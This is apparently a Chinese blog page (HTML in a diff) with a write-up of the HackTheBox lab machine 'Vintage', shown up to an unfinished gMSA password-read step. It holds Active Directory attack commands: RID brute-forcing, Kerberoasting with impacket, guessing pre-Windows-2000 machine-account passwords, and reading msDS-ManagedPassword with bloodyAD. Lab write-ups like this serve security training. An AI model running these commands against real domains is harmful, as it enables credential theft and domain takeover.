@@ -1,0 +1,290 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sgg5joot><head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/png" href="/favicon.png"><link rel="icon" href="/favicon.ico" sizes="any"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Zumpyx Blog" href="https://blog.zumpyx.com/rss.xml"><meta name="generator" content="Astro v7.1.0"><meta name="color-scheme" content="light dark"><meta name="theme-color" content="#0b0d11" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#f4f5f7" media="(prefers-color-scheme: light)"><script>
+	(() => {
+		try {
+			const t = localStorage.getItem('theme');
+			if (t === 'light' || t === 'dark') document.documentElement.setAttribute('data-theme', t);
+			else document.documentElement.removeAttribute('data-theme');
+		} catch {}
+	})();
+</script><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/89758defcfa85239.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/14aa8dd5744dd4bc.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/89758defcfa85239.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/14aa8dd5744dd4bc.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://blog.zumpyx.com/hackthebox/machines/0637-vintage/"><!-- Primary Meta Tags --><title>Vintage · Zumpyx Blog</title><meta name="description" content="Vintage is a hard difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment without ADCS installed, and NTLM authentication is disabled. There is a &amp;amp;quot;Pre-Created computer account,&amp;amp;quot; meaning the password is the same as the sAMAccountName of the machine account. The &amp;amp;quot;Domain Computer&amp;amp;quot; organisational unit (OU) has a configuration allowing attackers to read the service account password, which has gMSA configured. After obtaining the password, the service account can add itself to a privileged group. The group has complete control over a disabled user. The attacker is supposed to restore the disabled user and set a Service Principal Name (SPN) to perform Kerberoasting. After recovering the password, the user account has reused the same password. The newly compromised user has a password stored in the Credential Manager. The user can add itself to another privileged group configured for Resource-Based Constrained Delegation (RBCD) on the Domain Controller, allowing the attacker to compromise it."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.zumpyx.com/hackthebox/machines/0637-vintage/"><meta property="og:title" content="Vintage · Zumpyx Blog"><meta property="og:description" content="Vintage is a hard difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment without ADCS installed, and NTLM authentication is disabled. There is a &amp;amp;quot;Pre-Created computer account,&amp;amp;quot; meaning the password is the same as the sAMAccountName of the machine account. The &amp;amp;quot;Domain Computer&amp;amp;quot; organisational unit (OU) has a configuration allowing attackers to read the service account password, which has gMSA configured. After obtaining the password, the service account can add itself to a privileged group. The group has complete control over a disabled user. The attacker is supposed to restore the disabled user and set a Service Principal Name (SPN) to perform Kerberoasting. After recovering the password, the user account has reused the same password. The newly compromised user has a password stored in the Credential Manager. The user can add itself to another privileged group configured for Resource-Based Constrained Delegation (RBCD) on the Domain Controller, allowing the attacker to compromise it."><meta property="og:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://blog.zumpyx.com/hackthebox/machines/0637-vintage/"><meta name="twitter:title" content="Vintage · Zumpyx Blog"><meta name="twitter:description" content="Vintage is a hard difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment without ADCS installed, and NTLM authentication is disabled. There is a &amp;amp;quot;Pre-Created computer account,&amp;amp;quot; meaning the password is the same as the sAMAccountName of the machine account. The &amp;amp;quot;Domain Computer&amp;amp;quot; organisational unit (OU) has a configuration allowing attackers to read the service account password, which has gMSA configured. After obtaining the password, the service account can add itself to a privileged group. The group has complete control over a disabled user. The attacker is supposed to restore the disabled user and set a Service Principal Name (SPN) to perform Kerberoasting. After recovering the password, the user account has reused the same password. The newly compromised user has a password stored in the Credential Manager. The user can add itself to another privileged group configured for Resource-Based Constrained Delegation (RBCD) on the Domain Controller, allowing the attacker to compromise it."><meta name="twitter:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><link rel="stylesheet" href="/_astro/Header.BMe4uPxC.css"><style>.machine-list[data-astro-cid-twh6cqtg]{border:1px solid var(--border);border-radius:var(--radius);background:var(--bg-elevated);box-shadow:var(--shadow);margin-bottom:2rem;padding:1rem 1.15rem}.machine-list[data-astro-cid-twh6cqtg] h2[data-astro-cid-twh6cqtg]{font-size:1.1rem;font-family:var(--font-mono);color:var(--accent);margin:0 0 .65rem}.machine-list[data-astro-cid-twh6cqtg] ul[data-astro-cid-twh6cqtg]{margin:0;padding-left:1.2rem}.machine-list[data-astro-cid-twh6cqtg] li[data-astro-cid-twh6cqtg]{margin:.35rem 0}.machine-ref[data-astro-cid-twh6cqtg]{color:var(--text-bright);align-items:center;gap:.5rem;text-decoration:none;display:inline-flex}.machine-ref[data-astro-cid-twh6cqtg]:hover{color:var(--accent)}.machine-ref[data-astro-cid-twh6cqtg] img[data-astro-cid-twh6cqtg]{object-fit:cover;border:1px solid var(--border);border-radius:6px}.missing[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-family:var(--font-mono);font-size:.9em}.diff[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-size:.9em}.diff[data-astro-cid-twh6cqtg].very-easy{color:var(--very-easy)}.diff[data-astro-cid-twh6cqtg].easy{color:var(--easy)}.diff[data-astro-cid-twh6cqtg].medium{color:var(--medium)}.diff[data-astro-cid-twh6cqtg].hard{color:var(--hard)}.diff[data-astro-cid-twh6cqtg].insane{color:var(--insane)}
+main[data-astro-cid-sgg5joot]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-sgg5joot]{width:100%}.hero-image[data-astro-cid-sgg5joot] img[data-astro-cid-sgg5joot]{border-radius:var(--radius);border:1px solid var(--border);box-shadow:var(--shadow);margin:0 auto;display:block}.prose[data-astro-cid-sgg5joot]{width:720px;max-width:calc(100% - 2em);color:var(--text);margin:auto;padding:1em}.prose[data-astro-cid-sgg5joot] img{border-radius:var(--radius-sm);border:1px solid var(--border);max-width:100%;height:auto}.prose[data-astro-cid-sgg5joot] a{color:var(--link)}.title[data-astro-cid-sgg5joot]{text-align:center;margin-bottom:1.25em;padding:1.25em 0 .5em;line-height:1.2}.title-row[data-astro-cid-sgg5joot]{justify-content:center;align-items:center;gap:.85rem;margin:0 0 .5em;display:flex}.title-row[data-astro-cid-sgg5joot] .avatar[data-astro-cid-sgg5joot],.title-row[data-astro-cid-sgg5joot] img{border-radius:var(--radius-sm);object-fit:contain;border:1px solid var(--border);width:52px;height:52px;box-shadow:0 0 20px var(--accent-glow);background:0 0;flex:none}.title[data-astro-cid-sgg5joot] h1[data-astro-cid-sgg5joot]{margin:0;font-size:clamp(1.75rem,4vw,2.5rem)}.date[data-astro-cid-sgg5joot]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;margin-bottom:.65em;font-size:.85rem}.last-updated-on[data-astro-cid-sgg5joot]{opacity:.85;margin-top:.25em;font-style:normal}.meta[data-astro-cid-sgg5joot]{flex-wrap:wrap;justify-content:center;gap:.45em;margin:.85em 0 0;display:flex}.meta[data-astro-cid-sgg5joot] .badge{font-size:.72rem;font-weight:600;font-family:var(--font-mono);letter-spacing:.06em;color:var(--text);border:1px solid var(--border);text-transform:uppercase;background:#ffffff08;border-radius:999px;align-items:center;gap:.35em;padding:.35em .75em;display:inline-flex;box-shadow:inset 0 1px #ffffff08}.meta[data-astro-cid-sgg5joot] .badge.difficulty-very-easy{color:var(--very-easy);background:#9ef01a1a;border-color:#9ef01a52}.meta[data-astro-cid-sgg5joot] .badge.difficulty-easy{color:var(--easy);background:#9fef001f;border-color:#9fef0059}.meta[data-astro-cid-sgg5joot] .badge.difficulty-medium{color:var(--medium);background:#ffcc001f;border-color:#ffcc0059}.meta[data-astro-cid-sgg5joot] .badge.difficulty-hard{color:var(--hard);background:#ff88001f;border-color:#f806}.meta[data-astro-cid-sgg5joot] .badge.difficulty-insane{color:var(--insane);background:#ff3e3e1f;border-color:#ff3e3e66}.links[data-astro-cid-sgg5joot]{font-size:.9rem;font-family:var(--font-mono);flex-wrap:wrap;justify-content:center;gap:1em;margin-top:.9em;display:flex}.links[data-astro-cid-sgg5joot] a{color:var(--accent);text-decoration:none}.links[data-astro-cid-sgg5joot] a:hover{text-underline-offset:.2em;text-decoration:underline}
+.nav-link[data-astro-cid-evkijfd6]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;text-transform:uppercase;white-space:nowrap;border:1px solid #0000;border-radius:999px;justify-content:center;align-items:center;padding:.5em .95em;font-size:.78rem;font-weight:500;text-decoration:none;transition:color .18s,background .18s,border-color .18s,box-shadow .18s;display:inline-flex}.nav-link[data-astro-cid-evkijfd6]:hover{color:var(--text-bright);background:var(--surface-hover);text-decoration:none}.nav-link[data-astro-cid-evkijfd6].active{color:var(--on-accent);background:linear-gradient(135deg, var(--accent-hover), var(--accent));box-shadow:0 0 0 1px var(--border-strong), 0 6px 16px var(--accent-glow-strong);text-shadow:none;border-color:#0000;font-weight:700;text-decoration:none}
+</style><script type="module" src="/_astro/page.CTxKKjGj.js"></script></head><body data-astro-cid-sgg5joot><div class="scanline" aria-hidden="true" data-astro-cid-sgg5joot></div><header data-astro-cid-nen7h5rs><div class="bar" data-astro-cid-nen7h5rs><a class="brand" href="/" data-astro-cid-nen7h5rs><span class="logo" aria-hidden="true" data-astro-cid-nen7h5rs><img src="/_astro/head.CE6FOIKY_1SW1hc.webp" srcset="/_astro/head.CE6FOIKY_1SW1hc.webp 1x, /_astro/head.CE6FOIKY_scYzG.webp 2x" alt data-astro-cid-nen7h5rs="true" loading="lazy" decoding="async" width="64" height="64" class="logo-img"></span><span class="brand-text" data-astro-cid-nen7h5rs><span class="prompt" aria-hidden="true" data-astro-cid-nen7h5rs>~/</span><span class="brand-name" data-astro-cid-nen7h5rs>Zumpyx Blog</span></span></a><nav class="nav-pill" aria-label="Primary" data-astro-cid-nen7h5rs><div class="nav-track" data-astro-cid-nen7h5rs><a href="/" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Home</a><a href="/blog" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Blog</a><a href="/hackthebox" class="nav-link active" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>HackTheBox</a><a href="/projects" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Projects</a><a href="/about" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>About</a></div></nav><div class="actions" data-astro-cid-nen7h5rs><button type="button" class="icon-btn search-trigger" data-search-open aria-label="搜索" title="搜索 (Ctrl/⌘+K)" data-astro-cid-7yy3665x><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg></button><div class="search-root" data-search-root hidden data-astro-cid-7yy3665x><div class="search-backdrop" data-search-close data-astro-cid-7yy3665x></div><div class="search-panel" role="dialog" aria-modal="true" aria-label="全站搜索" data-astro-cid-7yy3665x><div class="search-bar" data-astro-cid-7yy3665x><svg class="search-ico" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg><input type="search" class="search-input" data-search-input placeholder="全文搜索：标题 / 正文 / 标签…" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="search" data-astro-cid-7yy3665x><kbd class="search-kbd" data-search-close-hint data-astro-cid-7yy3665x>Esc</kbd></div><div class="search-meta" data-search-meta data-astro-cid-7yy3665x>输入关键词开始搜索</div><ul class="search-results" data-search-results role="listbox" aria-label="搜索结果" data-astro-cid-7yy3665x></ul></div></div><script type="module" src="/_astro/SiteSearch.astro_astro_type_script_index_0_lang.CiT4pk6n.js"></script><button type="button" class="icon-btn theme-toggle" data-theme-toggle aria-label="主题：跟随系统" title="主题：跟随系统（点击切换）" data-astro-cid-l6lhmie6><span class="icon icon-system" aria-hidden="true" data-astro-cid-l6lhmie6><!-- auto / system --><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><rect x="3" y="4" width="18" height="12" rx="2" data-astro-cid-l6lhmie6></rect><path d="M8 20h8M12 16v4" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-light" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><circle cx="12" cy="12" r="4" data-astro-cid-l6lhmie6></circle><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-dark" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><path d="M21 14.5A8.5 8.5 0 1 1 9.5 3a7 7 0 0 0 11.5 11.5z" stroke-linejoin="round" data-astro-cid-l6lhmie6></path></svg></span></button><script>
+	(() => {
+		const KEY = 'theme';
+		const ORDER = ['system', 'light', 'dark'];
+		const LABELS = {
+			system: '主题：跟随系统',
+			light: '主题：亮色',
+			dark: '主题：暗色',
+		};
+
+		const getStored = () => {
+			try {
+				const v = localStorage.getItem(KEY);
+				if (v === 'light' || v === 'dark' || v === 'system') return v;
+			} catch {}
+			return 'system';
+		};
+
+		const apply = (mode) => {
+			const root = document.documentElement;
+			if (mode === 'light' || mode === 'dark') root.setAttribute('data-theme', mode);
+			else root.removeAttribute('data-theme');
+			try {
+				if (mode === 'system') localStorage.removeItem(KEY);
+				else localStorage.setItem(KEY, mode);
+			} catch {}
+		};
+
+		const syncButton = (mode) => {
+			document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+				btn.setAttribute('data-mode', mode);
+				btn.setAttribute('aria-label', LABELS[mode]);
+				btn.setAttribute('title', `${LABELS[mode]}（点击切换）`);
+				btn.querySelectorAll('.icon').forEach((el) => {
+					el.hidden = true;
+				});
+				const icon = btn.querySelector(`.icon-${mode}`);
+				if (icon) icon.hidden = false;
+			});
+		};
+
+		const mode = getStored();
+		apply(mode);
+		syncButton(mode);
+
+		document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+			btn.addEventListener('click', () => {
+				const cur = getStored();
+				const next = ORDER[(ORDER.indexOf(cur) + 1) % ORDER.length];
+				apply(next);
+				syncButton(next);
+			});
+		});
+
+		// If following system, react to OS changes
+		try {
+			const mq = window.matchMedia('(prefers-color-scheme: dark)');
+			mq.addEventListener?.('change', () => {
+				if (getStored() === 'system') apply('system');
+			});
+		} catch {}
+	})();
+</script><a class="icon-btn" href="/rss.xml" target="_blank" rel="noopener noreferrer" title="RSS" aria-label="RSS 订阅" data-astro-cid-nen7h5rs><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-nen7h5rs><path d="M5 19a1.5 1.5 0 1 0 0.01 0" fill="currentColor" stroke="none" data-astro-cid-nen7h5rs></path><path d="M4 11a9 9 0 0 1 9 9" stroke-linecap="round" data-astro-cid-nen7h5rs></path><path d="M4 5a15 15 0 0 1 15 15" stroke-linecap="round" data-astro-cid-nen7h5rs></path></svg></a></div></div></header><main data-astro-cid-sgg5joot><article data-astro-cid-sgg5joot><div class="prose" data-astro-cid-sgg5joot><div class="title" data-astro-cid-sgg5joot><div class="date" data-astro-cid-sgg5joot><time datetime="2024-11-30T00:00:00.000Z">2024-11-30</time></div><div class="title-row" data-astro-cid-sgg5joot><img src="/_astro/avatar.BhEQzI9r_1hSAjv.webp" alt data-astro-cid-sgg5joot="true" loading="lazy" decoding="async" width="48" height="48" class="avatar"><h1 data-astro-cid-sgg5joot>Vintage</h1></div><div class="meta" data-astro-cid-sgg5joot><span class="badge" data-astro-cid-twh6cqtg>Machines</span><span class="badge" data-astro-cid-twh6cqtg>#637</span><span class="badge difficulty-hard" data-astro-cid-twh6cqtg>Hard</span><span class="badge" data-astro-cid-twh6cqtg>Windows</span></div><div class="links" data-astro-cid-sgg5joot><a href="/hackthebox/machines/" data-astro-cid-twh6cqtg>← Machines</a></div><hr data-astro-cid-sgg5joot></div><blockquote>
+<p><strong>Tags:</strong> Kerberos、Rid-brute、Pre-Windows_2000、Kerberoastring、BloodHound、AS-REP_Roasting、GMSA、密码喷射、DPAPI、KCD</p>
+</blockquote>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>As is common in real life Windows pentests, you will start the Vintage box with credentials for the following </span></span>
+<span class="line"><span>account: P.Rosa / Rosaisbest123</span></span></code></pre>
+<h2 id="recon--enum">Recon &amp; Enum</h2>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>PORT      STATE SERVICE       VERSION</span></span>
+<span class="line"><span>53/tcp    open  domain        Simple DNS Plus</span></span>
+<span class="line"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-02 01:52:56Z)</span></span>
+<span class="line"><span>135/tcp   open  msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span></span>
+<span class="line"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)</span></span>
+<span class="line"><span>445/tcp   open  microsoft-ds?</span></span>
+<span class="line"><span>464/tcp   open  kpasswd5?</span></span>
+<span class="line"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span></span>
+<span class="line"><span>636/tcp   open  tcpwrapped</span></span>
+<span class="line"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)</span></span>
+<span class="line"><span>3269/tcp  open  tcpwrapped</span></span>
+<span class="line"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span>
+<span class="line"><span>|_http-title: Not Found</span></span>
+<span class="line"><span>|_http-server-header: Microsoft-HTTPAPI/2.0</span></span>
+<span class="line"><span>9389/tcp  open  mc-nmf        .NET Message Framing</span></span>
+<span class="line"><span>49664/tcp open  msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49668/tcp open  msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span></span>
+<span class="line"><span>49683/tcp open  msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>50355/tcp open  msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>50376/tcp open  msrpc         Microsoft Windows RPC</span></span></code></pre>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> timedatectl</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> set-ntp</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> no</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> rdate</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -n</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> vintage.htb</span></span></code></pre>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>impacket-getTGT 'vintage.htb'/'P.Rosa':'Rosaisbest123' -dc-ip $IP</span></span>
+<span class="line"><span>netexec smb dc01.vintage.htb -d vintage.htb -k --rid-brute 10000</span></span></code></pre>
+<p><img alt="image-20241202163941538.png" loading="lazy" decoding="async" width="1540" height="633" src="/_astro/image-20241202163941538.CU0pqK3W_Fnyfr.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>Administrator</span></span>
+<span class="line"><span>Guest</span></span>
+<span class="line"><span>krbtgt</span></span>
+<span class="line"><span>DC01$</span></span>
+<span class="line"><span>gMSA01$</span></span>
+<span class="line"><span>FS01$</span></span>
+<span class="line"><span>M.Rossi</span></span>
+<span class="line"><span>R.Verdi</span></span>
+<span class="line"><span>L.Bianchi</span></span>
+<span class="line"><span>G.Viola</span></span>
+<span class="line"><span>C.Neri</span></span>
+<span class="line"><span>P.Rosa</span></span>
+<span class="line"><span>svc_sql</span></span>
+<span class="line"><span>svc_ldap</span></span>
+<span class="line"><span>svc_ark</span></span>
+<span class="line"><span>C.Neri_adm</span></span>
+<span class="line"><span>L.Bianchi_adm</span></span></code></pre>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip $IP</span></span>
+<span class="line"><span>export KRB5CCNAME=P.Rosa.ccache</span></span>
+<span class="line"><span>impacket-GetUserSPNs vintage.htb/ -usersfile info/user.list -request -dc-ip $IP -k -no-pass -outputfile info/spn.hash</span></span></code></pre>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">SMB</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 枚举出一些</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$结尾的用户</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">，当一个新的机器账户被配置成</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "pre-Windows 2000 computer"</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 时，它的密码会被设置成小写用户名去掉</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$符号</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">。那么针对三个账户进行测试</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">DC01$:dc01</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">gMSA01$:gmsa01</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">FS01$:fs01</span></span></code></pre>
+<blockquote>
+<p><a href="https://medium.com/@offsecdeer/finding-weak-ad-computer-passwords-e3dc1ed220df">https://medium.com/@offsecdeer/finding-weak-ad-computer-passwords-e3dc1ed220df</a>
+<a href="https://github.com/garrettfoster13/pre2k">https://github.com/garrettfoster13/pre2k</a></p>
+</blockquote>
+<p><img alt="image-20241202170548278.png" loading="lazy" decoding="async" width="1186" height="616" src="/_astro/image-20241202170548278.D5Nvzoh2_1A1eME.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">impacket-getTGT</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> vintage.htb/'FS01$':fs01</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -dc-ip</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $IP</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">bloodhound-python</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> vintage.htb</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -ns</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $IP</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> P.Rosa</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> Rosaisbest123</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -c</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> All</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> --zip</span></span></code></pre>
+<p><img alt="image-20241203153141389.png" loading="lazy" decoding="async" width="1473" height="889" src="/_astro/image-20241203153141389.ZlkUAx38_ZpJXNm.webp" srcset=""></p>
+<p>PRE-WINDOWS 2000 COMPATIBLE ACCESS 兼容组在 AUTHENTICATED USERS 组中，有权限读取所有对象的所有属性。</p>
+<h2 id="shell-as-cneri">Shell as C.Neri</h2>
+<p><img alt="image-20241203161711643.png" loading="lazy" decoding="async" width="1885" height="862" src="/_astro/image-20241203161711643.dHWiIsvK_Z1z5TUu.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">impacket-getTGT</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> vintage.htb/'FS01$':fs01</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -dc-ip</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $IP</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">KRB5CCNAME</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">FS01</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\$</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">.ccache</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> bloodyAD</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> --host</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> dc01.vintage.htb</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> vintage.htb</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -k</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> get</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> object</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 'GMSA01$'</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> --attr</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> msDS-ManagedPassword</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">distinguishedName:</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> CN=gMSA01,CN=Managed</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> Service</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> Accounts,DC=vintage,DC=htb</span></span>
